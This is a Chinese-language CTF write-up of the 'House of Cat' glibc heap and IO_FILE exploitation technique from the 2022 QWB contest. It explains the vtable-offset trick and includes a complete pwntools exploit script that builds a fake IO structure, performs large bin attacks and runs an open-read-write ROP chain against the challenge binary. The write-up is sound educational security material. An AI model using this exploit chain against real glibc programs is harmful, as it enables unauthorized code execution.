
# House of Cat

## 前言

5月份偶然发现的一种新型 GLIBC 中 IO 利用思路，目前适用于任何版本（包括 `glibc2.35`），命名为 House of Cat 并出现在 2022 强网杯中。

## 简介

[House of emma](https://bbs.pediy.com/thread-270429.htm) 是 `glibc2.34` 下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于 TLS 的 `_pointer_chk_guard`，并且远程可能需要爆破 TLS 偏移。

House of Cat 利用了 House of emma 的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过 TLS 上 `_pointer_chk_guard` 检测相关的 IO 函数的调用，转而调用 `_IO_wfile_jumps` 中的 `_IO_wfile_seekoff` 函数，然后进入到 `_IO_switch_to_wget_mode` 函数中来攻击，从而使得攻击条件和利用变得更为简单。

并且 House of Cat 在 FSOP 的情况下也是可行的，只需修改虚表指针的偏移来调用 `_IO_wfile_seekoff` 即可（通常是结合 `__malloc_assert`，将 vtable 改为 `_IO_wfile_jumps+0x10`）。

## 利用条件

1. 能够任意写一个可控地址。
2. 能够泄露堆地址和 libc 基址。
3. 能够触发 IO 流（FSOP 或触发 `__malloc_assert`，或者程序中存在 `puts` 等能进入 IO 链的函数），执行 IO 相关函数。

## 利用原理

### IO_FILE 结构及利用

在高版本 libc 中，当攻击条件有限（如不能造成任意地址写）或者 libc 版本中无 hook 函数（libc2.34 及以后）时，伪造 fake_IO 进行攻击是一种常见可行的攻击方式。

常见的触发 IO 函数的方式有 FSOP、`__malloc_assert`（当然也可以用 `puts` 等函数，只不过需要任意地址写任意值直接改掉 libc 中的 stdout 结构体，hhh）。当进入 IO 流时会根据 vtable 指针调用相关的 IO 函数，如果在题目中造成任意地址写一个可控地址（如 large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造 fake_IO 结构体配合恰当的 IO 调用链，可以达到控制程序执行流的效果。

### vtable 检查

在 `glibc2.24` 以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。

```c
void _IO_vtable_check (void) attribute_hidden;

static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
    uintptr_t section_length =
        __stop___libc_IO_vtables - __start___libc_IO_vtables;
    uintptr_t ptr = (uintptr_t) vtable;
    uintptr_t offset =
        ptr - (uintptr_t) __start___libc_IO_vtables;

    if (__glibc_unlikely (offset >= section_length))
        _IO_vtable_check ();

    return vtable;
}
```

其检查流程为：计算 `_IO_vtable` 段的长度（`section_length`），用当前虚表指针的地址减去 `_IO_vtable` 段的开始地址。如果 vtable 相对于开始地址的偏移大于等于 `section_length`，那么就会进入 `_IO_vtable_check` 进行更详细的检查，否则的话会正常调用。如果 vtable 是非法的，进入 `_IO_vtable_check` 函数后会触发 abort。

虽然对 vtable 的检查较为严格，但是对于具体位置和具体偏移的检测则较为宽松，可以修改 vtable 指针为虚表段内的任意位置，也就是对于某一个 `_IO_xxx_jumps` 的任意偏移，使得其调用攻击者想要调用的 IO 函数。

### `__malloc_assert` 与 FSOP

在 glibc 中存在一个函数 `_malloc_assert`，其中会根据 vtable 表，如 `_IO_xxx_jumps`，调用 IO 等相关函数；该函数最终会根据 stderr 这个 IO 结构体进行相关的 IO 操作。

![图片描述](https://bbs.kanxue.com/upload/attach/202208/959842_2TUB4VGA9XXNZ8R.png)

## 示例代码

```python
from pwn import *
p = process('./houseofcat')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)

sa('mew mew mew~~~~~~', 'LOGIN | r00t QWB QWXFadmin')


def add(idx, size, cont):
    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
    sla('plz input your cat choice:\n', str(1))
    sla('plz input your cat idx:\n', str(idx))
    sla('plz input your cat size:\n', str(size))
    sa('plz input your content:\n', cont)


def delete(idx):
    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
    sla('plz input your cat choice:\n', str(2))
    sla('plz input your cat idx:\n', str(idx))


def show(idx):
    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
    sla('plz input your cat choice:\n', str(3))
    sla('plz input your cat idx:\n', str(idx))


def edit(idx, cont):
    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
    sla('plz input your cat choice:\n', str(4))
    sla('plz input your cat idx:\n', str(idx))
    sa('plz input your content:\n', cont)


# gdb.attach(p, 'b* $rebase(0x1DDD)')

add(0, 0x420, 'aaa')
add(1, 0x430, 'bbb')
add(2, 0x418, 'ccc')
delete(0)
add(3, 0x440, 'ddd')
show(0)

ru('Context:\n')
libcbase = u64(p.recv(6).ljust(8, '\x00')) - 0x21a0d0
info('libc->' + hex(libcbase))

rdi = libcbase + 0x000000000002a3e5
rsi = libcbase + 0x000000000002be51
rdxr12 = libcbase + 0x000000000011f497
ret = libcbase + 0x0000000000029cd6
rax = libcbase + 0x0000000000045eb0
stderr = libcbase + libc.sym['stderr']
setcontext = libcbase + libc.sym['setcontext']
close = libcbase + libc.sym['close']
read = libcbase + libc.sym['read']
write = libcbase + libc.sym['write']
syscallret = libcbase + libc.search(asm('syscall\nret')).next()

p.recv(10)
heapaddr = u64(p.recv(6).ljust(8, '\x00')) - 0x290
info('heap->' + hex(heapaddr))

# fake IO
ioaddr = heapaddr + 0xb00
next_chain = 0

fake_IO_FILE = p64(0) * 4
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(1) + p64(2)
fake_IO_FILE += p64(heapaddr + 0xc18 - 0x68)  # rdx
fake_IO_FILE += p64(setcontext + 61)  # call addr
fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapaddr + 0x200)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(heapaddr + 0xb30)  # rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
fake_IO_FILE += p64(1)  # _mode = 1
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
fake_IO_FILE += p64(libcbase + 0x2160d0)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(heapaddr + 0xb30 + 0x10)  # rax2

flagaddr = heapaddr + 0x17d0
payload1 = (
    fake_IO_FILE
    + p64(flagaddr)
    + p64(0)
    + p64(0) * 5
    + p64(heapaddr + 0x2050)
    + p64(ret)
)

delete(2)
add(6, 0x418, payload1)
delete(6)

# large bin attack stderr pointer
edit(
    0,
    p64(libcbase + 0x21a0d0) * 2
    + p64(heapaddr + 0x290)
    + p64(stderr - 0x20)
)

add(5, 0x440, 'aaaaa')
add(7, 0x430, 'flag')
add(8, 0x430, 'eee')

# rop
payload = (
    p64(rdi)
    + p64(0)
    + p64(close)
    + p64(rdi)
    + p64(flagaddr)
    + p64(rsi)
    + p64(0)
    + p64(rax)
    + p64(2)
    + p64(syscallret)
    + p64(rdi)
    + p64(0)
    + p64(rsi)
    + p64(flagaddr)
    + p64(rdxr12)
    + p64(0x50)
    + p64(0)
    + p64(read)
    + p64(rdi)
    + p64(1)
    + p64(write)
)

add(9, 0x430, payload)
delete(5)
add(10, 0x450, p64(0) + p64(1))
delete(8)

# large bin attack topchunk's size
edit(
    5,
    p64(libcbase + 0x21a0e0) * 2
    + p64(heapaddr + 0x1370)
    + p64(heapaddr + 0x28e0 - 0x20 + 3)
)

# trigger __malloc_assert
sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
sla('plz input your cat choice:\n', str(1))
sla('plz input your cat idx:', str(11))
gdb.attach(p, 'b* (_IO_wfile_seekoff)')
sla('plz input your cat size:', str(0x450))
p.interactive()
```

![图片描述](upload/attach/202208/959842_7VJKBZ3N98T2PN4.png)

## 结语

在 2022 强网杯初赛中，由于比赛前夕其他 House of 手法的发布以及 House of emma + 堆风水的使用，导致本题被非预期。但是强网杯 House of Cat 这道题目本意不是通过现成的攻击方式来利用，而是考察现找 IO 链的能力。题目解法不限于一种，感兴趣的师傅可以自行去研究其他的攻击方式。
